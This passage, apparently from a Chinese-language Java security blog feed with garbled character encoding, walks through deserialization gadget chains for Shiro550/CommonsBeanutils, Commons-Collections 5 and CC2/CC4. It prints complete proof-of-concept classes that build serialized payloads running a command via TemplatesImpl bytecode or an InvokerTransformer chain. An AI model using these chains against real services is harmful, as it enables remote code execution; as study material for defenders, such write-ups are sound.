class="operator">=</span> c1.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        nameField.set(templates,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodesField</span> <span class="operator">=</span> c1.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodesField.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\BadClass\\Calc.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes = &#123;code&#125;;</span><br><span class="line">        bytecodesField.set(templates,codes);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//CB</span></span><br><span class="line">        <span class="type">BeanComparator</span> <span class="variable">beanComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BeanComparator</span>(<span class="string">&quot;outputProperties&quot;</span>, <span class="keyword">new</span> <span class="title class_">AttrCompare</span>());</span><br><span class="line"></span><br><span class="line">        <span class="comment">//CC2</span></span><br><span class="line">        <span class="type">TransformingComparator</span> <span class="variable">transformingComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>&lt;&gt;(<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>&lt;&gt;(<span class="number">1</span>));</span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">priorityQueue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;(transformingComparator);</span><br><span class="line"></span><br><span class="line">        priorityQueue.add(templates);</span><br><span class="line">        priorityQueue.add(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        Class&lt;PriorityQueue&gt; c2 = PriorityQueue.class;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">comparator</span> <span class="operator">=</span> c2.getDeclaredField(<span class="string">&quot;comparator&quot;</span>);</span><br><span class="line">        comparator.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        comparator.set(priorityQueue, beanComparator);</span><br><span class="line"></span><br><span class="line">        serialize(priorityQueue);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object object)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">os</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fos);</span><br><span class="line">        os.writeObject(object);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a href="https://imgse.com/i/ppUzsfO"><img src="https://s1.ax1x.com/2023/03/21/ppUzsfO.png" alt="ppUzsfO.png"></a></p><h5 id="æ— ccä¾èµ–é“¾"><a href="#æ— ccä¾èµ–é“¾" class="headerlink" title="æ— ccä¾èµ–é“¾"></a>æ— ccä¾èµ–é“¾</h5><p>åœ¨å‰é¢çš„é“¾å­ä¸­ç”¨åˆ°äº†cc2é“¾ä¸­çš„PriorityQueueç±»å»å¯»æ‰¾compareï¼Œè€Œæ­¤ç±»ä¾èµ–äº<code>org.apache.commons.collections4</code>ã€‚<br>è€Œåœ¨commons-beanutilsåŒ…ä¸­å­˜åœ¨ä¸€ä¸ªç±»ï¼šorg.apache.commons.beanutils.BeanComparator ï¼Œèƒ½å¤Ÿåˆ©ç”¨æ­¤ç±»å»å¯»æ‰¾compareã€‚</p><p><strong>Exp</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ctf.cb;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.BeanComparator;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Collections;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">cb1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c1</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> c1.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        nameField.set(templates,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodesField</span> <span class="operator">=</span> c1.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodesField.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\BadClass\\Calc.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes = &#123;code&#125;;</span><br><span class="line">        bytecodesField.set(templates,codes);</span><br><span class="line"></span><br><span class="line">        <span class="type">BeanComparator</span> <span class="variable">beanComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BeanComparator</span>(<span class="literal">null</span>, Collections.reverseOrder());</span><br><span class="line">        PriorityQueue&lt;Object&gt; queue = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;Object&gt;(<span class="number">2</span>, beanComparator);queue.add(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">        queue.add(<span class="string">&quot;1&quot;</span>);</span><br><span class="line"></span><br><span class="line">        setValue(beanComparator, <span class="string">&quot;property&quot;</span>, <span class="string">&quot;outputProperties&quot;</span>);</span><br><span class="line">        setValue(queue, <span class="string">&quot;queue&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates, templates&#125;);</span><br><span class="line"></span><br><span class="line">        serialize(queue);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object object)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">os</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fos);</span><br><span class="line">        os.writeObject(object);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">oi</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fis);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> oi.readObject();</span><br><span class="line">        <span class="keyword">return</span> object;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setValue</span><span class="params">(Object obj, String name, Object value)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(name);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>[<a href="https://imgse.com/i/ppUz6pD"><img src="https://s1.ax1x.com/2023/03/21/ppUz6pD.png" alt="ppUz6pD.png"></a>](<a href="https://imgse.com/i/ppUX0G4">https://imgse.com/i/ppUX0G4</a>)</p><h3 id="ysoseriaé“¾é—®é¢˜"><a href="#ysoseriaé“¾é—®é¢˜" class="headerlink" title="ysoseriaé“¾é—®é¢˜"></a>ysoseriaé“¾é—®é¢˜</h3><p>åœ¨ä½¿ç”¨ysoseriaé“¾å¸¦çš„Expæ—¶ï¼Œå¯èƒ½ä¼šå‡ºç°å¦‚ä¸‹æŠ¥é”™</p><p><a href="https://imgse.com/i/ppUzg6H"><img src="https://s1.ax1x.com/2023/03/21/ppUzg6H.png" alt="ppUzg6H.png"></a></p><p>serialVersionUIDä¸åŒ¹é…</p><p>åŸå› å‡ºåœ¨ysoseriaæ˜¯åˆ©ç”¨çš„CommonsBeanutils1.9.2çš„ä¾èµ–ï¼Œè€Œshiro550è‡ªå¸¦çš„æ˜¯CommonsBeanutils1.8.3ï¼Œä»£ç æ˜¯æœ‰äº›è®¸å·®åˆ«çš„</p>]]></content>
      
      
      <categories>
          
          <category> Javaå®‰å…¨ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> shiro550 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Javaå®‰å…¨ä¹‹è·¯--CC5</title>
      <link href="/2022/10/09/CC5/"/>
      <url>/2022/10/09/CC5/</url>
      
        <content type="html"><![CDATA[<h1 id="Commons-Collecttions5ååºåˆ—åŒ–"><a href="#Commons-Collecttions5ååºåˆ—åŒ–" class="headerlink" title="Commons-Collecttions5ååºåˆ—åŒ–"></a>Commons-Collecttions5ååºåˆ—åŒ–</h1><h2 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h2><p>æ–°å»ºMavené¡¹ç›®ï¼Œå¯¼å…¥ä¾èµ–</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.2.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="Gadget"><a href="#Gadget" class="headerlink" title="Gadget"></a>Gadget</h2><p><a href="https://imgse.com/i/ppmwGR0"><img src="https://s1.ax1x.com/2023/03/08/ppmwGR0.png" alt="ppmwGR0.png"></a></p><p>TiedMapEntry.getValue</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">getValue</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> map.get(key);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>TiedMapEntry.toString</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> getKey() + <span class="string">&quot;=&quot;</span> + getValue();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>BadAttributeValueExpException.readObject</p><p><a href="https://imgse.com/i/ppmwqOS"><img src="https://s1.ax1x.com/2023/03/08/ppmwqOS.png" alt="ppmwqOS.png"></a></p><p>é“¾å­éå¸¸ç®€å•ï¼ŒååŠæ®µå°±æ˜¯CC1ååŠæ®µï¼ŒæŠŠmapèµ‹å€¼ä¸ºLazyMapå»è°ƒç”¨LazyMap.getå³å¯</p><p>ä½†æœ‰ä¸ªé—®é¢˜éœ€è¦æ³¨æ„</p><p>çœ‹BadAttributeValueExpExceptionçš„æ„é€ å‡½æ•°</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">BadAttributeValueExpException</span> <span class="params">(Object val)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.val = val == <span class="literal">null</span> ? <span class="literal">null</span> : val.toString();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨è¿™é‡Œä¼šç›´æ¥è°ƒç”¨toStringæ–¹æ³• ï¼Œæ‰€ä»¥å’Œå‰é¢çš„put,addä¸€æ ·ï¼Œä¸€å¼€å§‹éœ€è¦èµ‹å€¼ä¸€ä¸ªå…¶ä»–ä¸œè¥¿ï¼Œåºåˆ—åŒ–å‰å†æ”¹å›TiedMapEntry</p><p><strong>POC</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC5</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span> , <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span> , <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125; , <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span>  <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        HashMap&lt;Object,Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        Map&lt;Object,Object&gt; lazyMap =  LazyMap.decorate(map, chainedTransformer);</span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, <span class="string">&quot;aaa&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">badAttributeValueExpException</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>));</span><br><span class="line"></span><br><span class="line">        setValue(badAttributeValueExpException,<span class="string">&quot;val&quot;</span>,  tiedMapEntry);</span><br><span class="line"></span><br><span class="line">        serialize(badAttributeValueExpException);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object object)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">os</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fos);</span><br><span class="line">        os.writeObject(object);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">oi</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fis);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> oi.readObject();</span><br><span class="line">        <span class="keyword">return</span> object;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setValue</span><span class="params">(Object obj, String name, Object value)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(name);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a href="https://imgse.com/i/ppm0SWq"><img src="https://s1.ax1x.com/2023/03/08/ppm0SWq.png" alt="ppm0SWq.png"></a></p>]]></content>
      
      
      <categories>
          
          <category> Javaå®‰å…¨ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> CCé“¾ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Javaå®‰å…¨ä¹‹è·¯--CC2ã€CC4</title>
      <link href="/2022/10/08/CC2%E3%80%81CC4/"/>
      <url>/2022/10/08/CC2%E3%80%81CC4/</url>
      
        <content type="html"><![CDATA[<h1 id="Commons-Collecttions2ã€4ååºåˆ—åŒ–"><a href="#Commons-Collecttions2ã€4ååºåˆ—åŒ–" class="headerlink" title="Commons-Collecttions2ã€4ååºåˆ—åŒ–"></a>Commons-Collecttions2ã€4ååºåˆ—åŒ–</h1><h2 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h2><p>æ–°å»ºMavené¡¹ç›®ï¼Œå¯¼å…¥ä¾èµ–</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.commons<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections4<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="CC4"><a href="#CC4" class="headerlink" title="CC4"></a>CC4</h2><h3 id="Gadget"><a href="#Gadget" class="headerlink" title="Gadget"></a>Gadget</h3><p>CommonsCollections4é™¤4.0çš„å…¶ä»–ç‰ˆæœ¬ä¸­<code>InvokerTransformer</code>ä¸å†ç»§æ‰¿Serializableæ¥å£ï¼Œæ‰€ä»¥æ— æ³•åºåˆ—åŒ–ã€‚ å¯¼è‡´å‰é¢é“¾å­ä¸å¯ç”¨<a href="https://imgse.com/i/ppmYOeA"><img src="https://s1.ax1x.com/2023/03/08/ppmYOeA.png" alt="ppmYOeA.png"></a></p><p><code>TransformingComparator.compare</code>å¯ä»¥å®ç°å¯¹transformçš„è°ƒç”¨</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">compare</span><span class="params">(I obj1, I obj2)</span> &#123;</span><br><span class="line">    <span class="type">O</span> <span class="variable">value1</span> <span class="operator">=</span> <span class="built_in">this</span>.transformer.transform(obj1);</span><br><span class="line">    <span class="type">O</span> <span class="variable">value2</span> <span class="operator">=</span> <span class="built_in">this</span>.transformer.transform(obj2);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.decorated.compare(value1, value2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>PriorityQueue.readObject=&gt;heapify()=&gt;siftDown()=&gt;siftDownUsingComparator()=&gt;compare()</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span><br><span class="line">    <span class="keyword">throws</span> java.io.IOException, ClassNotFoundException &#123;</span><br><span class="line">    <span class="comment">// Read in size, and any hidden stuff</span></span><br><span class="line">    s.defaultReadObject();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Read in (and discard) array length</span></span><br><span class="line">    s.readInt();</span><br><span class="line"></span><br><span class="line">    queue = <span class="keyword">new</span> <span class="title class_">Object</span>[size];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Read in all elements.</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; size; i++)</span><br><span class="line">        queue[i] = s.readObject();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Elements are guaranteed to be in &quot;proper order&quot;, but the</span></span><br><span class="line">    <span class="comment">// spec has never explained what that might be.</span></span><br><span class="line">    heapify();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a href="https://imgse.com/i/ppmtEoq"><img src="https://s1.ax1x.com/2023/03/08/ppmtEoq.png" alt="ppmtEoq.png"></a></p><p><code>TransformingComparator</code> çš„æ„é€ æ–¹æ³•å¯ä»¥ç›´æ¥å¯¹<code>transformer</code>è¿›è¡Œèµ‹å€¼</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">TransformingComparator</span><span class="params">(<span class="keyword">final</span> Transformer&lt;? <span class="built_in">super</span> I, ? extends O&gt; transformer,</span></span><br><span class="line"><span class="params">                              <span class="keyword">final</span> Comparator&lt;O&gt; decorated)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.decorated = decorated;</span><br><span class="line">    <span class="built_in">this</span>.transformer = transformer;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>PriorityQueue</code> çš„æ„é€ æ–¹æ³•ä¹Ÿå¯ä»¥ç›´æ¥å¯¹<code>comparator</code>èµ‹å€¼</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">PriorityQueue</span><span class="params">(<span class="type">int</span> initialCapacity,</span></span><br><span class="line"><span class="params">                     Comparator&lt;? <span class="built_in">super</span> E&gt; comparator)</span> &#123;</span><br><span class="line">    <span class="comment">// Note: This restriction of at least one is not actually 